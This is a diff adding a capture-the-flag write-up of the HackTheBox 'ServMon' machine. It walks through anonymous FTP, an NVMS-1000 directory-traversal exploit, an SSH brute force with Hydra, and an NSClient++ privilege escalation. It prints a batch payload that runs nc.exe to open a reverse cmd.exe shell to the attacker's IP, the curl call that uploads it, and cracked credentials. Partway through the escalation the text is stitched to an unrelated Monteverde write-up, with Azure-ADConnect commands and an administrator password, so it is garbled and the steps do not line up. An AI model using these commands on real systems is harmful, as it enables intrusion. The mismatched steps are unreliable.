@@ -1,0 +1,360 @@
+I"Mb<h2 id="brief">Brief</h2>
+<p>    On enumerating different services of <code class="highlighter-rouge">ServMon</code> machine, we were able to find few confidentails files from <code class="highlighter-rouge">FTP</code> service which discloses a hint saying that list of password is stored in <code class="highlighter-rouge">Nathan</code> uers desktop. On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. <code class="highlighter-rouge">NVMS-1000</code>. On assessing the software, it was vulnerable to <code class="highlighter-rouge">Directory Traversal</code> vulnerability which helps us to conquer the <code class="highlighter-rouge">Passwords.txt</code> from <code class="highlighter-rouge">Nathan's</code> desktop by using exploit available on exploit-db. On this point we have got a list of passsword and two usersname ( <code class="highlighter-rouge">Nathan</code> and <code class="highlighter-rouge">Nadine</code> ), we try to brute force the available <code class="highlighter-rouge">SSH</code> service on target machine using <code class="highlighter-rouge">Hydra</code>. On the conclusion of brute forcing, we were able to find credentails of <code class="highlighter-rouge">nadine</code> and taking leverage of it, we ssh to the machine using <code class="highlighter-rouge">nadine</code> cracked password and get <code class="highlighter-rouge">proof.txt</code>. Once we got the local access, enumeration helped us to find <code class="highlighter-rouge">NSClient++</code> running and on expxloitation of it using publicly available script, we were able to get maximum level of privelege and get <code class="highlighter-rouge">root.txt</code>.</p>
+
+<p> </p>
+
+<h2 id="flow">Flow</h2>
+<ul>
+  <li>
+    <p><code class="highlighter-rouge">Anonymous FTP</code> reveals <code class="highlighter-rouge">Confidential.txt</code> file from <code class="highlighter-rouge">Nadine</code> folder sharing a hint of <code class="highlighter-rouge">Passwords.txt</code> being stored in <code class="highlighter-rouge">Nathan's</code> desktop.</p>
+  </li>
+  <li>
+    <p>Exploiting <code class="highlighter-rouge">NVMS-1000's Directory Traversal</code> vulneability available on port 80 to get <code class="highlighter-rouge">Passwords.txt</code> file using script from <code class="highlighter-rouge">exploit-db</code></p>
+  </li>
+  <li>
+    <p>Brute force <code class="highlighter-rouge">SSH</code> service using two usernames <code class="highlighter-rouge">Nathan</code> and <code class="highlighter-rouge">Nadine</code> against <code class="highlighter-rouge">Passwords.txt</code> using <code class="highlighter-rouge">hydra</code></p>
+  </li>
+  <li>
+    <p>Login as <code class="highlighter-rouge">nadine</code> with credentials found via <code class="highlighter-rouge">hydra</code> ( <code class="highlighter-rouge">nadine:L1k3B1gBut7s@W0rk</code> )</p>
+  </li>
+  <li>
+    <p>Get <code class="highlighter-rouge">user.txt</code></p>
+  </li>
+  <li>
+    <p>Local enumeramation discloses usage of <code class="highlighter-rouge">NSClient++</code> and also <code class="highlighter-rouge">nmap</code> ( <strong>8443</strong> )report discloses the same in target machine</p>
+  </li>
+  <li>
+    <p>Search for <code class="highlighter-rouge">NSClient ++</code> leads to publicly available writeup ( <code class="highlighter-rouge">exploit-db</code> ) to escalate the privilege.</p>
+  </li>
+  <li>
+    <p>Follow steps provided in write-up</p>
+  </li>
+  <li>
+    <p>Get <code class="highlighter-rouge">root.txt</code></p>
+  </li>
+</ul>
+
+<p> </p>
+
+<p>Below is a detail writeup of the machine following the below steps:</p>
+
+<ol>
+  <li>
+    <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering">Information Gathering</a></p>
+  </li>
+  <li>
+    <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell">Low-Privilege Shell</a></p>
+  </li>
+  <li>
+    <p><a href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion">Privilege Escalation</a></p>
+  </li>
+</ol>
+
+<p id="informationgathering">&nbsp;</p>
+
+<h2 id="1-information-gathering">1. Information Gathering</h2>
+<p> </p>
+<h3 id="11--nmap">1.1 || Nmap</h3>
+
+<p>-&gt; <code class="highlighter-rouge">Run nmap</code></p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ nmap -sC -sV -p- -oA full 10.10.10.184</span>
+</code></pre></div></div>
+<p>where,</p>
+
+<p>    -sC : Run Default Scripts</p>
+
+<p>    -sV : Enumerate different versions</p>
+
+<p>    -sA : Store the output in all format (.nmap, .xml and .gnmap) having name full</p>
+
+<p><strong>Result:</strong></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1"># Nmap 7.80 scan initiated Sat May  2 17:07:00 2020 as: nmap -sC -sV -oA tcp 10.10.10.184</span>
+<span class="s">Nmap scan report for 10.10.10.184</span>
+<span class="s">Host is up (0.22s latency).</span>
+<span class="na">Not shown</span><span class="pi">:</span> <span class="s">991 closed ports</span>
+<span class="s">PORT     STATE SERVICE       VERSION</span>
+<span class="s">21/tcp   open  ftp           Microsoft ftpd</span>
+  <span class="s">ftp-anon</span><span class="pi">:</span> <span class="s">Anonymous FTP login allowed (FTP code 230)</span>
+ <span class="s">_01-18-20  12:05PM       &lt;DIR&gt;          Users</span>
+  <span class="s">ftp-syst</span><span class="pi">:</span> 
+ <span class="na">_  SYST</span><span class="pi">:</span> <span class="s">Windows_NT</span>
+<span class="s">22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)</span>
+  <span class="s">ssh-hostkey</span><span class="pi">:</span> 
+    <span class="s">2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)</span>
+    <span class="s">256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)</span>
+ <span class="s">_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)</span>
+<span class="s">80/tcp   open  http</span>
+  <span class="s">fingerprint-strings</span><span class="pi">:</span> 
+    <span class="s">GetRequest, HTTPOptions, RTSPRequest</span><span class="pi">:</span> 
+      <span class="s">HTTP/1.1 200 OK</span>
+      <span class="s">Content-type</span><span class="pi">:</span> <span class="s">text/html</span>
+      <span class="na">Content-Length</span><span class="pi">:</span> <span class="m">340</span>
+      <span class="na">Connection</span><span class="pi">:</span> <span class="s">close</span>
+     <span class="na">AuthInfo</span><span class="pi">:</span> 
+      <span class="s">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span>
+      <span class="s">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;</span>
+      <span class="s">&lt;head&gt;</span>
+      <span class="s">&lt;title&gt;&lt;/title&gt;</span>
+      <span class="s">&lt;script type="text/javascript"&gt;</span>
+      <span class="s">window.location.href = "Pages/login.htm";</span>
+      <span class="s">&lt;/script&gt;</span>
+      <span class="s">&lt;/head&gt;</span>
+      <span class="s">&lt;body&gt;</span>
+      <span class="s">&lt;/body&gt;</span>
+      <span class="s">&lt;/html&gt;</span>
+    <span class="na">NULL</span><span class="pi">:</span> 
+      <span class="s">HTTP/1.1 408 Request Timeout</span>
+      <span class="s">Content-type</span><span class="pi">:</span> <span class="s">text/html</span>
+      <span class="na">Content-Length</span><span class="pi">:</span> <span class="m">0</span>
+      <span class="na">Connection</span><span class="pi">:</span> <span class="s">close</span>
+ <span class="na">_    AuthInfo</span><span class="pi">:</span>
+ <span class="na">_http-title</span><span class="pi">:</span> <span class="s">Site doesn't have a title (text/html).</span>
+ <span class="na">_http-trane-info</span><span class="pi">:</span> <span class="s">Problem with XML parsing of /evox/about</span>
+<span class="s">135/tcp  open  msrpc         Microsoft Windows RPC</span>
+<span class="s">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="s">445/tcp  open  microsoft-ds?</span>
+<span class="s">5666/tcp open  tcpwrapped</span>
+<span class="s">6699/tcp open  napster?</span>
+<span class="s">8443/tcp open  ssl/https-alt</span>
+  <span class="s">fingerprint-strings</span><span class="pi">:</span> 
+    <span class="s">FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions</span><span class="pi">:</span> 
+      <span class="s">HTTP/1.1 </span><span class="m">404</span>
+      <span class="na">Content-Length</span><span class="pi">:</span> <span class="m">18</span>
+      <span class="s">Document not found</span>
+    <span class="na">GetRequest</span><span class="pi">:</span> 
+     <span class="s">HTTP/1.1 </span><span class="m">302</span>
+      <span class="na">Content-Length</span><span class="pi">:</span> <span class="m">0</span>
+      <span class="na">Location</span><span class="pi">:</span> <span class="s">/index.html</span>
+      <span class="s">urday</span>
+      <span class="s">workers</span>
+ <span class="s">_    jobs</span>
+  <span class="s">http-title</span><span class="pi">:</span> <span class="s">NSClient++</span>
+ <span class="s">_Requested resource was /index.html</span>
+  <span class="s">ssl-cert</span><span class="pi">:</span> <span class="na">Subject</span><span class="pi">:</span> <span class="s">commonName=localhost</span>
+  <span class="s">Not valid before</span><span class="pi">:</span> <span class="s">2020-01-14T13:24:20</span>
+ <span class="na">_Not valid after</span><span class="pi">:</span>  <span class="s">2021-01-13T13:24:20</span>
+ <span class="na">_ssl-date</span><span class="pi">:</span> <span class="s">TLS randomness does not represent time</span>
+<span class="s">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service</span> <span class="pi">:</span>
+<span class="err">			</span><span class="s">NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span>
+<span class="s">SF-Port80-TCP:V=7.80%I=7%D=5/2%Time=5EAD5B9B%P=x86_64-pc-linux-gnu%r(NULL,</span>
+<span class="s">SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm</span>
+<span class="s">SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\</span>
+<span class="s">SF:r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text</span>
+<span class="s">SF:/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x2</span>
+<span class="s">SF:0\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH</span>
+<span class="s">SF:TML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DT</span>
+<span class="s">SF:D/xhtml1-transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.o</span>
+<span class="s">SF:rg/1999/xhtml\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x</span>
+<span class="s">SF:20\x20\x20&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20\</span>
+<span class="s">SF:x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20</span>
+<span class="s">SF:\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n")%</span>
+<span class="s">SF:r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html</span>
+<span class="s">SF:\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n</span>
+<span class="s">SF:\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x</span>
+<span class="s">SF:201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xht</span>
+<span class="s">SF:ml1-transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.org/19</span>
+<span class="s">SF:99/xhtml\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x2</span>
+<span class="s">SF:0\x20&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20\x20\x</span>
+<span class="s">SF:20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\</span>
+<span class="s">SF:x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n")%r(RTS</span>
+<span class="s">SF:PRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nC</span>
+<span class="s">SF:ontent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\</span>
+<span class="s">SF:xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.</span>
+<span class="s">SF:0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-t</span>
+<span class="s">SF:ransitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.org/1999/xh</span>
+<span class="s">SF:tml\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x20\x20</span>
+<span class="s">SF:&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x2</span>
+<span class="s">SF:0window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x</span>
+<span class="s">SF:20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n");</span>
+<span class="s">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span>
+<span class="s">SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=5/2%Time=5EAD5BA3%P=x86_64-pc-linux-gnu</span>
+<span class="s">SF:%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:</span>
+<span class="s">SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\x1d\x02\0\0\0\0\0\0\x1d\x0</span>
+<span class="s">SF:2\0\0urday\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x0</span>
+<span class="s">SF:3\x18\xbb\x01\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Lengt</span>
+<span class="s">SF:h:\x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP</span>
+<span class="s">SF:/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")</span>
+<span class="s">SF:%r(RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDoc</span>
+<span class="s">SF:ument\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Le</span>
+<span class="s">SF:ngth:\x2018\r\n\r\nDocument\x20not\x20found");</span>
+<span class="na">Service Info</span><span class="pi">:</span> <span class="na">OS</span><span class="pi">:</span> <span class="s">Windows; CPE</span><span class="pi">:</span> <span class="s">cpe:/o:microsoft:windows</span>
+
+<span class="na">Host script results</span><span class="pi">:</span>
+ <span class="na">_clock-skew</span><span class="pi">:</span> <span class="s">3m07s</span>
+  <span class="s">smb2-security-mode</span><span class="pi">:</span> 
+    <span class="s">2.02</span><span class="pi">:</span> 
+ <span class="s">_    Message signing enabled but not required</span>
+  <span class="s">smb2-time</span><span class="pi">:</span> 
+    <span class="na">date</span><span class="pi">:</span> <span class="s">2020-05-02T11:43:32</span>
+ <span class="na">_  start_date</span><span class="pi">:</span> <span class="s">N/A</span>
+
+<span class="s">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="c1"># Nmap done at Sat May  2 17:11:06 2020 -- 1 IP address (1 host up) scanned in 246.55 seconds</span>
+
+</code></pre></div></div>
+<p> </p>
+
+<h3 id="12--ftp">1.2 || FTP</h3>
+
+<p>Nmap result shows us that it has <code class="highlighter-rouge">FTP</code> service running and on detecting <code class="highlighter-rouge">Anonymous FTP</code>, we were able to get FTP access of the machine. <code class="highlighter-rouge">Anonymous FTP</code> reveals a file named <code class="highlighter-rouge">Confidential.txt</code> which gives us hint of a <code class="highlighter-rouge">Passwors.txt</code> file being stored in <code class="highlighter-rouge">Nathane's</code> Desktop.</p>
+
+<p>-&gt; <code class="highlighter-rouge">FTP access</code></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ ftp 10.10.10.184</span>
+</code></pre></div></div>
+<p><img src="/assets/img/posts/HTB/ServMon/1.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/2.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p><strong>Confidential.txt</strong></p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/3.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<h3 id="13--nvms-1000-port-80">1.3 || NVMS-1000 (Port 80)</h3>
+
+<p>On exploring port 80, we were able to discover a Network Surveillance Management Software i.e. <code class="highlighter-rouge">NVMS-1000</code>. Exploit-Db suggests an exploit of <code class="highlighter-rouge">NVMS-1000</code> being vulnerable to Directory Traversal attack.</p>
+
+<p><strong>POC</strong>: <a href="https://www.expxloit-db.com/exploits/48311">https://www.expxloit-db.com/exploits/48311</a></p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/4.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p>Executing the script by providing proper paarameters as shown in below picture results in access of <code class="highlighter-rouge">Passwords.txt</code> from <code class="highlighter-rouge">Nathan's</code> desktop.</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ python 48311.py http://10.10.10.184/ /Users/Nathan/Desktop/Passwords.txt passwords_list.txt</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/posts/HTB/ServMon/5.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<h2 id="2-low-privilege-shell">2. Low-Privilege Shell</h2>
+
+<p>Once we have acquired the password file, ideally, any pentester would go for <code class="highlighter-rouge">Brute Forcing</code> methodology as we have two usernames ( <code class="highlighter-rouge">Nathane</code> and <code class="highlighter-rouge">Nadine</code> ) and a password file.</p>
+
+<p>Using <a href="">Hydra</a> for brute forcing the <code class="highlighter-rouge">SSH</code> service, we successfully pwned one of the users ( <code class="highlighter-rouge">Nadine</code> ) password</p>
+
+<p>-&gt; <code class="highlighter-rouge">Run Hydra</code></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ hydra -l nadine -P passwords.txt 10.10.10.182</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/posts/HTB/ServMon/6.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p>-&gt; <code class="highlighter-rouge">SSH login to get Low-Privilege Shell</code></p>
+
+<p>As we were successfully able to retrieve password of <code class="highlighter-rouge">Nadine</code>, we’ll login as <code class="highlighter-rouge">Nadine</code> via <code class="highlighter-rouge">SSH</code> service and complete one of the challegenes of the machine i.e. acquire user.txt file.</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ ssh 10.10.10.184</span>
+</code></pre></div></div>
+<p><img src="/assets/img/posts/HTB/ServMon/7.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p>-&gt; <code class="highlighter-rouge">Get user.txt</code></p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/8.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<h2 id="3-privilege-escalation">3. Privilege Escalation</h2>
+
+<h3 id="31--enumerate-local-system">3.1 || Enumerate local system</h3>
+
+<p>Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses <code class="highlighter-rouge">NSClient ++</code>. This service was also discover via nmap output ( <code class="highlighter-rouge">8443</code> .)</p>
+
+<p><strong>Port 8443</strong></p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/9.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p>On searching for exploits with respect to <code class="highlighter-rouge">NSClient ++</code>, we were able to find a wtiteup on exploit-db to escalte the privilege by exploiting <code class="highlighter-rouge">NSClient ++</code> exploit.</p>
+
+<p><strong>NSClient ++ writeup on exploit-db</strong>: <a href="https://www.expxloit-db.com/exploits/46802">https://www.expxloit-db.com/exploits/46802</a></p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/10.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<h3 id="32---nsclient--steps">3.2 ||  NSClient ++ Steps</h3>
+
+<p>-&gt; <code class="highlighter-rouge">Step 1: Grab Web Admin Password</code></p>
+
+<p>Navigate to <code class="highlighter-rouge">C:\Program Files\NSClient++</code> folder and execute the below command:</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ nscp.exe web --password --display</span>
+</code></pre></div></div>
+<p><img src="/assets/img/posts/HTB/ServMon/11.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<p>-&gt; <code class="highlighter-rouge">Step 2: Enable CheckExternalScript &amp; Scheduler</code></p>
+
+<p>On checking the configuration file ( <code class="highlighter-rouge">nsclient.ini</code> ), <code class="highlighter-rouge">CheckExternalScript</code> &amp; <code class="highlighter-rouge">Scheduler</code> were enabled already.</p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/12.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/13.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<p>-&gt; <code class="highlighter-rouge">Step 3: Create Payload</code></p>
+
+<p>As per the exploit poc, we are supposed to create a <code class="highlighter-rouge">.bat</code> consisting of the below payload and add as an external script to <code class="highlighter-rouge">NSClient++</code>.</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">@</span><span class="s">echo off</span>
+<span class="s">C:\temp\nc.exe 10.10.15.137 443 -e cmd.exe</span>
+</code></pre></div></div>
+<p>where,</p>
+
+<p>    10.10.15.137 : Listening HOST ( Attacking machine’s IP address)</p>
+
+<p>    443: Listening Port ( Attacking machine’s listening port)</p>
+
+<p><img src="/assets/img/posts/HTB/ServMon/13.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p><strong>Commands Issued</strong></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">$ echo @off &gt; evilish.bat</span>
+<span class="s">$ echo C:\Temp\nc.exe 10.10.15.137 443 -e cmd.exe</span>
+</code></pre></div></div>
+
+<p>Adding an external script can be acheived by logging in via the web portal availble on port <code class="highlighter-rouge">8443</code>. However, for some strange reason, the web portal seemt to be very unstable and hence, we’ll be following <code class="highlighter-rouge">API</code> available in documentation of <a href="">NSClient_++</a> via using curl commands locally.</p>
+
+<p>Under the <code class="highlighter-rouge">Scripts</code> section API documentation, we were able to discover a method to add an external script. Below is the issued command:</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @evilish.bat</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/8.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p><strong>Command Issued</strong></p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">./Azure-ADConnect.ps1</span>
+<span class="s">import-module ./Azure-ADConnect.ps1</span>
+<span class="s">Azure-ADConnect -server 127.0.0.1 -db ADSync</span> 
+</code></pre></div></div>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/9.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<h3 id="32--privileged-shell">3.2 || Privileged Shell</h3>
+
+<p>Using the genrated credentials by the script (<code class="highlighter-rouge">administrator:d0m@in4adminyeah!</code>), we were able to get the highest level of privilege of the machine.</p>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/10.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<p> </p>
+
+<h3 id="33--roottxt">3.3 || root.txt</h3>
+
+<p><img src="/assets/img/posts/HTB/Monteverde/11.png" alt="deploy using travis" class="img-fluid" /></p>
+
+<h2 id="key-takeway">Key Takeway:</h2>
+
+<p>As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.</p>
+
+<p>For me, the key takeway was a reminder for basic routine check of security misconfiguration where the password of one the users were set as the username itself.</p>
+
+:ET
